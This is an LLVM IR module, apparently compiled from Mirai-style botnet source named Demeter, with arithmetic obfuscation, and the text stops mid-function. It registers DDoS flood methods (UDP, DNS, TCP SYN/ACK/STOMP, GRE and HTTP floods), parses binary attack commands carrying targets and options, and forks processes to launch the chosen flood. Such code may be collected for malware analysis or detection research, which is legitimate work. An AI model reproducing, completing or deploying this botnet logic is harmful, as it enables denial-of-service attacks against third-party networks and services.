; ModuleID = 'host/ir_sub/Demeter.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [63 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 1043935, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  call void @add_attack(i8 zeroext 9, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* bitcast (void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*))
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = sub i32 0, 1
  %19 = sub i32 %17, %18
  %20 = add nsw i32 %17, 1
  %21 = sext i32 %19 to i64
  %22 = mul i64 %21, 8
  %23 = call i8* @realloc(i8* %15, i64 %22) #6
  %24 = bitcast i8* %23 to %struct.attack_method**
  store %struct.attack_method** %24, %struct.attack_method*** @methods, align 8
  %25 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %26 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %27 = load i8, i8* @methods_len, align 1
  %28 = sub i8 0, %27
  %29 = sub i8 0, 1
  %30 = add i8 %28, %29
  %31 = sub i8 0, %30
  %32 = add i8 %27, 1
  store i8 %31, i8* @methods_len, align 1
  %33 = zext i8 %27 to i64
  %34 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %26, i64 %33
  store %struct.attack_method* %25, %struct.attack_method** %34, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %250

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 3406725978984036112
  %27 = sub i64 %26, 4
  %28 = add i64 %27, 3406725978984036112
  %29 = sub i64 %25, 4
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %4, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %17
  br label %250

; <label>:34:                                     ; preds = %17
  %35 = load i8*, i8** %3, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %3, align 8
  %37 = load i8, i8* %35, align 1
  store i8 %37, i8* %7, align 1
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = sub i64 %39, 7130858886670407883
  %41 = sub i64 %40, 1
  %42 = add i64 %41, 7130858886670407883
  %43 = sub i64 %39, 1
  %44 = trunc i64 %42 to i32
  store i32 %44, i32* %4, align 4
  %45 = load i32, i32* %4, align 4
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %34
  br label %250

; <label>:48:                                     ; preds = %34
  %49 = load i8*, i8** %3, align 8
  %50 = getelementptr inbounds i8, i8* %49, i32 1
  store i8* %50, i8** %3, align 8
  %51 = load i8, i8* %49, align 1
  store i8 %51, i8* %8, align 1
  %52 = load i32, i32* %4, align 4
  %53 = sext i32 %52 to i64
  %54 = add i64 %53, -4491043886111526825
  %55 = sub i64 %54, 1
  %56 = sub i64 %55, -4491043886111526825
  %57 = sub i64 %53, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %4, align 4
  %59 = load i8, i8* %8, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %48
  br label %250

; <label>:63:                                     ; preds = %48
  %64 = load i32, i32* %4, align 4
  %65 = sext i32 %64 to i64
  %66 = load i8, i8* %8, align 1
  %67 = zext i8 %66 to i64
  %68 = mul i64 5, %67
  %69 = icmp ult i64 %65, %68
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %63
  br label %250

; <label>:71:                                     ; preds = %63
  %72 = load i8, i8* %8, align 1
  %73 = zext i8 %72 to i64
  %74 = call noalias i8* @calloc(i64 %73, i64 24) #6
  %75 = bitcast i8* %74 to %struct.attack_target*
  store %struct.attack_target* %75, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %76

; <label>:76:                                     ; preds = %126, %71
  %77 = load i32, i32* %5, align 4
  %78 = load i8, i8* %8, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp slt i32 %77, %79
  br i1 %80, label %81, label %132

; <label>:81:                                     ; preds = %76
  %82 = load i8*, i8** %3, align 8
  %83 = bitcast i8* %82 to i32*
  %84 = load i32, i32* %83, align 4
  %85 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %86 = load i32, i32* %5, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %88, i32 0, i32 1
  store i32 %84, i32* %89, align 4
  %90 = load i8*, i8** %3, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 4
  store i8* %91, i8** %3, align 8
  %92 = load i8*, i8** %3, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %3, align 8
  %94 = load i8, i8* %92, align 1
  %95 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 2
  store i8 %94, i8* %99, align 4
  %100 = load i32, i32* %4, align 4
  %101 = sext i32 %100 to i64
  %102 = add i64 %101, -3421711555308637458
  %103 = sub i64 %102, 5
  %104 = sub i64 %103, -3421711555308637458
  %105 = sub i64 %101, 5
  %106 = trunc i64 %104 to i32
  store i32 %106, i32* %4, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 0
  store i16 2, i16* %112, align 4
  %113 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i64 %115
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i32 0, i32 1
  %118 = load i32, i32* %117, align 4
  %119 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %120 = load i32, i32* %5, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %119, i64 %121
  %123 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i32 0, i32 0
  %124 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %123, i32 0, i32 2
  %125 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %124, i32 0, i32 0
  store i32 %118, i32* %125, align 4
  br label %126

; <label>:126:                                    ; preds = %81
  %127 = load i32, i32* %5, align 4
  %128 = add i32 %127, -1100303689
  %129 = add i32 %128, 1
  %130 = sub i32 %129, -1100303689
  %131 = add nsw i32 %127, 1
  store i32 %130, i32* %5, align 4
  br label %76

; <label>:132:                                    ; preds = %76
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = icmp ult i64 %134, 1
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %132
  br label %250

; <label>:137:                                    ; preds = %132
  %138 = load i8*, i8** %3, align 8
  %139 = getelementptr inbounds i8, i8* %138, i32 1
  store i8* %139, i8** %3, align 8
  %140 = load i8, i8* %138, align 1
  store i8 %140, i8* %9, align 1
  %141 = load i32, i32* %4, align 4
  %142 = sext i32 %141 to i64
  %143 = sub i64 0, 1
  %144 = add i64 %142, %143
  %145 = sub i64 %142, 1
  %146 = trunc i64 %144 to i32
  store i32 %146, i32* %4, align 4
  %147 = load i8, i8* %9, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp sgt i32 %148, 0
  br i1 %149, label %150, label %242

; <label>:150:                                    ; preds = %137
  %151 = load i8, i8* %9, align 1
  %152 = zext i8 %151 to i64
  %153 = call noalias i8* @calloc(i64 %152, i64 16) #6
  %154 = bitcast i8* %153 to %struct.attack_option*
  store %struct.attack_option* %154, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %155

; <label>:155:                                    ; preds = %235, %150
  %156 = load i32, i32* %5, align 4
  %157 = load i8, i8* %9, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp slt i32 %156, %158
  br i1 %159, label %160, label %241

; <label>:160:                                    ; preds = %155
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 1
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %160
  br label %250

; <label>:165:                                    ; preds = %160
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  %169 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %170 = load i32, i32* %5, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %172, i32 0, i32 1
  store i8 %168, i8* %173, align 8
  %174 = load i32, i32* %4, align 4
  %175 = sext i32 %174 to i64
  %176 = sub i64 %175, -3943836845623427035
  %177 = sub i64 %176, 1
  %178 = add i64 %177, -3943836845623427035
  %179 = sub i64 %175, 1
  %180 = trunc i64 %178 to i32
  store i32 %180, i32* %4, align 4
  %181 = load i32, i32* %4, align 4
  %182 = sext i32 %181 to i64
  %183 = icmp ult i64 %182, 1
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %165
  br label %250

; <label>:185:                                    ; preds = %165
  %186 = load i8*, i8** %3, align 8
  %187 = getelementptr inbounds i8, i8* %186, i32 1
  store i8* %187, i8** %3, align 8
  %188 = load i8, i8* %186, align 1
  store i8 %188, i8* %12, align 1
  %189 = load i32, i32* %4, align 4
  %190 = sext i32 %189 to i64
  %191 = sub i64 0, 1
  %192 = add i64 %190, %191
  %193 = sub i64 %190, 1
  %194 = trunc i64 %192 to i32
  store i32 %194, i32* %4, align 4
  %195 = load i32, i32* %4, align 4
  %196 = load i8, i8* %12, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp slt i32 %195, %197
  br i1 %198, label %199, label %200

; <label>:199:                                    ; preds = %185
  br label %250

; <label>:200:                                    ; preds = %185
  %201 = load i8, i8* %12, align 1
  %202 = zext i8 %201 to i32
  %203 = add i32 %202, 1288684788
  %204 = add i32 %203, 1
  %205 = sub i32 %204, 1288684788
  %206 = add nsw i32 %202, 1
  %207 = sext i32 %205 to i64
  %208 = call noalias i8* @calloc(i64 %207, i64 1) #6
  %209 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %210 = load i32, i32* %5, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %212, i32 0, i32 0
  store i8* %208, i8** %213, align 8
  %214 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %215 = load i32, i32* %5, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %217, i32 0, i32 0
  %219 = load i8*, i8** %218, align 8
  %220 = load i8*, i8** %3, align 8
  %221 = load i8, i8* %12, align 1
  %222 = zext i8 %221 to i32
  call void @util_memcpy(i8* %219, i8* %220, i32 %222)
  %223 = load i8, i8* %12, align 1
  %224 = zext i8 %223 to i32
  %225 = load i8*, i8** %3, align 8
  %226 = sext i32 %224 to i64
  %227 = getelementptr inbounds i8, i8* %225, i64 %226
  store i8* %227, i8** %3, align 8
  %228 = load i8, i8* %12, align 1
  %229 = zext i8 %228 to i32
  %230 = load i32, i32* %4, align 4
  %231 = sub i32 %230, 80906471
  %232 = sub i32 %231, %229
  %233 = add i32 %232, 80906471
  %234 = sub nsw i32 %230, %229
  store i32 %233, i32* %4, align 4
  br label %235

; <label>:235:                                    ; preds = %200
  %236 = load i32, i32* %5, align 4
  %237 = sub i32 %236, 657213488
  %238 = add i32 %237, 1
  %239 = add i32 %238, 657213488
  %240 = add nsw i32 %236, 1
  store i32 %239, i32* %5, align 4
  br label %155

; <label>:241:                                    ; preds = %155
  br label %242

; <label>:242:                                    ; preds = %241, %137
  %243 = call i32* @__errno_location() #7
  store i32 0, i32* %243, align 4
  %244 = load i32, i32* %6, align 4
  %245 = load i8, i8* %7, align 1
  %246 = load i8, i8* %8, align 1
  %247 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %248 = load i8, i8* %9, align 1
  %249 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %244, i8 zeroext %245, i8 zeroext %246, %struct.attack_target* %247, i8 zeroext %248, %struct.attack_option* %249)
  br label %250

; <label>:250:                                    ; preds = %242, %199, %184, %164, %136, %70, %62, %47, %33, %16
  %251 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %252 = icmp ne %struct.attack_target* %251, null
  br i1 %252, label %253, label %256

; <label>:253:                                    ; preds = %250
  %254 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %255 = bitcast %struct.attack_target* %254 to i8*
  call void @free(i8* %255) #6
  br label %256

; <label>:256:                                    ; preds = %253, %250
  %257 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %258 = icmp ne %struct.attack_option* %257, null
  br i1 %258, label %259, label %263

; <label>:259:                                    ; preds = %256
  %260 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %261 = load i8, i8* %9, align 1
  %262 = zext i8 %261 to i32
  call void @free_opts(%struct.attack_option* %260, i32 %262)
  br label %263

; <label>:263:                                    ; preds = %259, %256
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %15 = call i32 @fork() #6
  store i32 %15, i32* %13, align 4
  %16 = load i32, i32* %13, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %21, label %18

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %13, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %18, %6
  ret void

; <label>:22:                                     ; preds = %18
  store i32 0, i32* %14, align 4
  store i32 0, i32* %14, align 4
  br label %23

; <label>:23:                                     ; preds = %54, %22
  %24 = load i32, i32* %14, align 4
  %25 = load i8, i8* @methods_len, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp slt i32 %24, %26
  br i1 %27, label %28, label %60

; <label>:28:                                     ; preds = %23
  %29 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %29, i64 %31
  %33 = load %struct.attack_method*, %struct.attack_method** %32, align 8
  %34 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %33, i32 0, i32 1
  %35 = load i8, i8* %34, align 8
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* %8, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %36, %38
  br i1 %39, label %40, label %53

; <label>:40:                                     ; preds = %28
  %41 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %42 = load i32, i32* %14, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %41, i64 %43
  %45 = load %struct.attack_method*, %struct.attack_method** %44, align 8
  %46 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %45, i32 0, i32 0
  %47 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = load i32, i32* %7, align 4
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %51 = load i8, i8* %11, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %47(i32 %48, i8 zeroext %49, %struct.attack_target* %50, i8 zeroext %51, %struct.attack_option* %52)
  br label %60

; <label>:53:                                     ; preds = %28
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = load i32, i32* %14, align 4
  %56 = add i32 %55, 1244186980
  %57 = add i32 %56, 1
  %58 = sub i32 %57, 1244186980
  %59 = add nsw i32 %55, 1
  store i32 %58, i32* %14, align 4
  br label %23

; <label>:60:                                     ; preds = %40, %23
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %38

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %35

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = sub i32 0, 1
  %33 = sub i32 %31, %32
  %34 = add nsw i32 %31, 1
  store i32 %33, i32* %5, align 4
  br label %10

; <label>:35:                                     ; preds = %10
  %36 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %37 = bitcast %struct.attack_option* %36 to i8*
  call void @free(i8* %37) #6
  br label %38

; <label>:38:                                     ; preds = %35, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %41

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %43

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = add i32 %36, -1136050990
  %38 = add i32 %37, 1
  %39 = sub i32 %38, -1136050990
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %10, align 4
  br label %11

; <label>:41:                                     ; preds = %11
  %42 = load i8*, i8** %9, align 8
  store i8* %42, i8** %5, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %27
  %44 = load i8*, i8** %5, align 8
  ret i8* %44
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

